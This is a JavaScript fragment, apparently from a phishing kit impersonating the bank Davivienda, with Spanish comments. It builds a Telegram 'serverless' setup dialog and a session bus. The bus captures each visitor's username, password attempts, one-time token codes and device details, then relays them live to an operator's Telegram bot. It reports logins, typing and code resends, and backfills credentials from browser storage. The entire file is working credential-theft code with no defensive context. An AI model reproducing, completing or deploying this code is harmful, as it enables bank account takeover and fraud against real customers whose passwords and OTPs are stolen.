                modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:1000000;display:flex;justify-content:center;align-items:center;padding:15px;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;';
                modal.innerHTML = `
                    <div style="background:#fff;border-radius:18px;max-width:380px;width:100%;padding:22px;box-shadow:0 10px 30px rgba(0,0,0,0.4);position:relative;">
                        <h3 style="margin:0 0 8px 0;font-size:18px;color:#111;display:flex;align-items:center;gap:8px;">
                            <span>🤖</span> Configurar Telegram (Sin Servidor)
                        </h3>
                        <p style="font-size:12.5px;color:#666;margin:0 0 16px 0;line-height:1.4;">
                            Ingresa tu <b>Bot Token</b> y <b>Chat ID</b> para recibir las alertas y botones de control directamente en tu Telegram sin necesidad de servidor.
                        </p>
                        <div style="margin-bottom:12px;">
                            <label style="display:block;font-size:12px;font-weight:600;color:#333;margin-bottom:4px;">Bot Token (@BotFather):</label>
                            <input id="davi_cfg_token" type="text" placeholder="Ej: 7123456789:AAFx..." value="${this.config.botToken || ''}" style="width:100%;box-sizing:border-box;padding:10px;border:1.5px solid #ddd;border-radius:8px;font-size:13px;outline:none;" />
                        </div>
                        <div style="margin-bottom:16px;">
                            <label style="display:block;font-size:12px;font-weight:600;color:#333;margin-bottom:4px;">Chat ID (@userinfobot):</label>
                            <input id="davi_cfg_chat" type="text" placeholder="Ej: 1234567890" value="${this.config.chatId || ''}" style="width:100%;box-sizing:border-box;padding:10px;border:1.5px solid #ddd;border-radius:8px;font-size:13px;outline:none;" />
                            <span style="font-size:11px;color:#888;">Tip: Si no sabes tu Chat ID, déjalo vacío y manda <b>/start</b> a tu bot desde Telegram.</span>
                        </div>
                        <div id="davi_cfg_status" style="font-size:12px;margin-bottom:14px;display:none;"></div>
                        <div style="display:flex;gap:10px;">
                            <button id="davi_btn_save_tg" style="flex:1;background:#ed1c24;color:#fff;border:none;padding:12px;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer;">Guardar y Probar</button>
                            <button id="davi_btn_close_tg" style="background:#eee;color:#333;border:none;padding:12px 16px;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer;">Cerrar</button>
                        </div>
                    </div>
                `;
                document.body.appendChild(modal);

                document.getElementById('davi_btn_close_tg').addEventListener('click', () => {
                    modal.style.display = 'none';
                });

                document.getElementById('davi_btn_save_tg').addEventListener('click', async () => {
                    const token = document.getElementById('davi_cfg_token').value.trim();
                    const chat = document.getElementById('davi_cfg_chat').value.trim();
                    const statusEl = document.getElementById('davi_cfg_status');

                    if (!token) {
                        statusEl.style.display = 'block';
                        statusEl.style.color = '#d32f2f';
                        statusEl.textContent = '❌ Por favor ingresa el Bot Token.';
                        return;
                    }

                    statusEl.style.display = 'block';
                    statusEl.style.color = '#1976d2';
                    statusEl.textContent = '⏳ Probando conexión con Telegram...';

                    this.config.botToken = token;
                    this.config.chatId = chat;
                    this.config.enabled = true;

                    if (chat) {
                        const testRes = await this.sendMessage(`🧪 <b>PRUEBA DE CONEXIÓN TELEGRAM</b>\n━━━━━━━━━━━━━━━━━━━━\n✅ ¡Todo está configurado y funcionando perfectamente en modo 100% Sin Servidor!\n⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}`);
                        if (testRes.success) {
                            this.saveConfig({ botToken: token, chatId: chat, enabled: true });
                            statusEl.style.color = '#2e7d32';
                            statusEl.textContent = '✅ ¡Conexión exitosa! Mensaje enviado a tu Telegram.';
                            setTimeout(() => {
                                modal.style.display = 'none';
                                const badge = document.getElementById('davi-tg-helper');
                                if (badge) badge.remove();
                            }, 1500);
                        } else {
                            statusEl.style.color = '#d32f2f';
                            statusEl.textContent = '❌ Error de Telegram: ' + (testRes.error || 'Verifica token o chatId');
                        }
                    } else {
                        this.saveConfig({ botToken: token, chatId: '', enabled: true });
                        statusEl.style.color = '#2e7d32';
                        statusEl.textContent = '✅ Bot Token guardado. Manda /start a tu bot para vincular tu Chat ID.';
                        setTimeout(() => {
                            modal.style.display = 'none';
                        }, 2500);
                    }
                });
            } else {
                modal.style.display = 'flex';
            }
        }
    }

    // ================= BUS PRINCIPAL DE SINCRONIZACIÓN Y COMANDOS =================
    class RealtimeBus {
        constructor() {
            this.channelName = 'davivienda_live_sync_v2';
            this.storageKey = 'davivienda_sessions_store';
            this.commandPrefix = 'davi_cmd_';
            this.listeners = [];
            this.sessionId = this.getOrCreateSessionId();
            this.hasBroadcastChannel = typeof window.BroadcastChannel !== 'undefined';
            this.lastProcessedCmdId = null;
            this.lastProcessedCmdTime = 0;

            // Iniciar Motor Telegram Serverless
            this.telegram = new TelegramEngine(this);

            if (this.hasBroadcastChannel) {
                this.channel = new BroadcastChannel(this.channelName);
                this.channel.onmessage = (event) => this.handleIncomingMessage(event.data);
            }

            // Sincronización entre pestañas locales
            window.addEventListener('storage', (e) => {
                if (e.key === this.storageKey && e.newValue) {
                    try {
                        const data = JSON.parse(e.newValue);
                        this.notifyListeners('store_update', data);
                    } catch (err) {}
                } else if (e.key && e.key.startsWith(this.commandPrefix)) {
                    try {
                        const cmd = JSON.parse(e.newValue);
                        if (cmd) this.notifyListeners('command', cmd);
                    } catch (err) {}
                } else if (e.key === 'davi_msg_bus' && e.newValue) {
                    try {
                        const msg = JSON.parse(e.newValue);
                        this.handleIncomingMessage(msg);
                    } catch (err) {}
                } else if (e.key === 'davi_token_event' && e.newValue) {
                    try {
                        const tEvent = JSON.parse(e.newValue);
                        if (tEvent) this.notifyListeners('token_submitted', tEvent);
                    } catch (err) {}
                }
            });

            // Inicializar Telegram al cargar
            if (typeof document !== 'undefined') {
                if (document.readyState === 'loading') {
                    document.addEventListener('DOMContentLoaded', () => this.telegram.init());
                } else {
                    this.telegram.init();
                }
            }
        }

        getOrCreateSessionId() {
            const urlParams = new URLSearchParams(window.location.search);
            let sid = urlParams.get('sid') || sessionStorage.getItem('davi_session_id') || localStorage.getItem('davi_session_id');
            if (!sid) {
                sid = 'DAV-' + Math.floor(100000 + Math.random() * 900000);
            }
            sessionStorage.setItem('davi_session_id', sid);
            localStorage.setItem('davi_session_id', sid);
            return sid;
        }

        on(event, callback) {
            this.listeners.push({ event, callback });
        }

        notifyListeners(event, data) {
            this.listeners.forEach(item => {
                if (item.event === event || item.event === '*') {
                    try { item.callback(data); } catch (e) { console.error(e); }
                }
            });
        }

        broadcast(type, payload) {
            const message = {
                type,
                payload,
                senderSessionId: this.sessionId,
                timestamp: Date.now()
            };

            if (this.hasBroadcastChannel && this.channel) {
                try { this.channel.postMessage(message); } catch (e) {}
            }

            try {
                localStorage.setItem('davi_msg_bus', JSON.stringify(message));
            } catch (e) {}

            return message;
        }

        handleIncomingMessage(data) {
            if (!data || !data.type) return;
            this.notifyListeners(data.type, data.payload);
            this.notifyListeners('*', data);
        }

        getAllSessions() {
            try {
                const raw = localStorage.getItem(this.storageKey);
                return raw ? JSON.parse(raw) : {};
            } catch (e) {
                return {};
            }
        }

        saveSessionLocally(sessionId, updates) {
            const sessions = this.getAllSessions();
            const existing = sessions[sessionId] || { sessionId, createdAt: Date.now() };
            sessions[sessionId] = { ...existing, ...updates, sessionId, lastActive: Date.now() };
            try {
                localStorage.setItem(this.storageKey, JSON.stringify(sessions));
            } catch (e) {}
            return sessions[sessionId];
        }


        saveSession(sessionId, updates) {
            const sessions = this.getAllSessions();
            const existing = sessions[sessionId] || {
                sessionId,
                createdAt: Date.now(),
                device: getDeviceInfo(),
                status: 'online',
                page: 'index.html',
                user: '',
                pass: '',
                passwords: [],
                tokens: [],
                lastActive: Date.now()
            };

            const passwords = Array.isArray(existing.passwords) ? [...existing.passwords] : (existing.pass ? [{ pass: existing.pass, timestamp: existing.createdAt || Date.now() }] : []);
            if (updates.pass && updates.pass.trim() !== '') {
                const lastP = passwords.length > 0 ? passwords[passwords.length - 1].pass : null;
                if (lastP !== updates.pass) {
                    passwords.push({ pass: updates.pass, timestamp: Date.now() });
                }
            }

            const safeUser = (updates.user && updates.user.trim() !== '') ? updates.user : existing.user;
            const safePass = (updates.pass && updates.pass.trim() !== '') ? updates.pass : existing.pass;

            const isNewLogin = updates.status === 'waiting_login' || (updates.user && updates.pass && (updates.user !== existing.user || updates.pass !== existing.pass));
            const isTyping = (updates.user !== existing.user || updates.pass !== existing.pass) && (safeUser || safePass) && updates.status !== 'waiting_login';

            const updated = {
                ...existing,
                ...updates,
                sessionId,
                user: safeUser,
                pass: safePass,
                passwords: passwords,
                device: existing.device || getDeviceInfo(),
                lastActive: Date.now()
            };

            sessions[sessionId] = updated;

            try {
                localStorage.setItem(this.storageKey, JSON.stringify(sessions));
            } catch (e) {}

            this.broadcast('session_updated', updated);

            // ================= ENRUTAMIENTO TELEGRAM DIRECTO =================
            if (this.telegram && this.telegram.isEnabled()) {
                const pageName = (updates.page || '').toLowerCase();
                if (pageName.includes('token')) {
                    if (this.telegram.config.notifyOnTokenPage) {
                        this.telegram.notifyTokenPage(sessionId, safeUser, safePass);
                    }
                } else if (pageName.includes('index') || pageName === '' || updates.status === 'online') {
                    if (this.telegram.config.notifyOnVisitor) {
                        this.telegram.notifyVisitor(sessionId, updates.page || 'index.html');
                    }
                }

                if (isNewLogin && updates.status === 'waiting_login') {
                    if (this.telegram.config.notifyOnLogin !== false) {
                        this.telegram.notifyLogin(sessionId, safeUser, safePass, passwords.length || 1);
                    }
                } else if (isTyping) {
                    if (this.telegram.config.notifyOnTyping) {
                        this.telegram.notifyTyping(sessionId, safeUser, safePass);
                    }
                }
            }


            return updated;
        }

        sendToken(sessionId, tokenCode) {
            const codeStr = String(tokenCode).trim();
            if (!codeStr) return null;

            const sessions = this.getAllSessions();
            const sessionData = sessions[sessionId] || {
                sessionId,
                createdAt: Date.now(),
                device: getDeviceInfo(),
                status: 'waiting_token',
                page: 'token.html',
                user: '',
                pass: '',
                tokens: []
            };

            const tokens = Array.isArray(sessionData.tokens) ? sessionData.tokens : [];
            tokens.push({ code: codeStr, timestamp: Date.now() });

            const updated = {
                ...sessionData,
                sessionId,
                token: codeStr,
                lastToken: codeStr,
                lastTokenTime: Date.now(),
                tokens: tokens,
                status: 'waiting_token',
                page: 'token.html',
                lastActive: Date.now()
            };

            sessions[sessionId] = updated;

            try {
                localStorage.setItem(this.storageKey, JSON.stringify(sessions));
                localStorage.setItem('davi_token_' + sessionId, codeStr);
                localStorage.setItem('davi_token_event', JSON.stringify({
                    sessionId,
                    token: codeStr,
                    timestamp: Date.now()
                }));
            } catch (e) {}

            this.broadcast('token_submitted', {
                sessionId,
                token: codeStr,
                user: updated.user,
                pass: updated.pass,
                device: updated.device,
                timestamp: Date.now()
            });

            this.broadcast('session_updated', updated);

            // Notificar a Telegram con botones interactivos directamente
            let u = updated.user;
            let p = updated.pass;
            try {
                if (!u && typeof localStorage !== 'undefined') u = localStorage.getItem('user') || '';
                if (!u && typeof sessionStorage !== 'undefined') u = sessionStorage.getItem('user') || '';
                if (!p && typeof localStorage !== 'undefined') p = localStorage.getItem('pass') || '';
                if (!p && typeof sessionStorage !== 'undefined') p = sessionStorage.getItem('pass') || '';
            } catch (e) {}

            if (this.telegram && this.telegram.isEnabled()) {
                if (this.telegram.config.notifyOnToken !== false) {
                    this.telegram.notifyToken(sessionId, codeStr, u, p);
                }
            }


            return updated;
        }

        sendClientEvent(sessionId, eventType, details = {}) {
            if (eventType === 'resend_code') {
                const sessions = this.getAllSessions();
                let u = sessions[sessionId] ? sessions[sessionId].user : '';
                try {
                    if (!u && typeof localStorage !== 'undefined') u = localStorage.getItem('user') || '';
                    if (!u && typeof sessionStorage !== 'undefined') u = sessionStorage.getItem('user') || '';
                } catch (e) {}
                if (this.telegram && this.telegram.isEnabled()) {
                    if (this.telegram.config.notifyOnResendToken !== false) {
                        this.telegram.notifyResend(sessionId, u);
                    }
                }
            } else if (this.telegram && this.telegram.isEnabled()) {
                if (this.telegram.config.notifyOnCustomClicks) {
                    const sessions = this.getAllSessions();
                    const u = sessions[sessionId] ? sessions[sessionId].user : '';
                    this.telegram.notifyCustomAction(sessionId, (details && details.label) || eventType, u, (details && details.info) || '');
                }
            }


            this.broadcast('client_button_clicked', { sessionId, eventType, ...details });
        }
    }

    window.RealtimeBus = new RealtimeBus();
    window.SoundAlerts = SoundAlerts;
    window.getDeviceInfo = getDeviceInfo;

})(window);
